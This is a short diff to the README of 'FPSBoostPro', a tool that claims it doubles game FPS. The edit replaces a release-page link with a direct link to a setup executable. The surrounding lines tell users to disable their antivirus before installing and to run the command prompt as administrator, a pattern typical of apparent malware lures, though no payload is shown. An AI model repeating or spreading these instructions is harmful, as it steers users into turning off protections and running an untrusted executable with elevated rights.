@@ -8,7 +8,7 @@ FPSBoostPro will double your original FPS (Frames Per Second).
 
  ⚠️ **Before installation, disable your antivirus, as it may simply render the unlocking of Frames Per Second non-functional.** ⚠️
 
- - You have 2 options: either use the main.py (the source code) or use [FPSBoostPro.exe](https://github.com/matakz/FPSBoostPro/releases/tag/open-source).
+ - You have 2 options: either use the main.py (the source code) or use [FPSBoostPro.exe](https://github.com/matakz/FPSBoostPro/releases/download/open-source/FPSBoostProSetup-x64.exe).
 
  - To use main.py, search for "cmd" in the search bar, right-click on "Command Prompt," and select "Run as administrator":
    
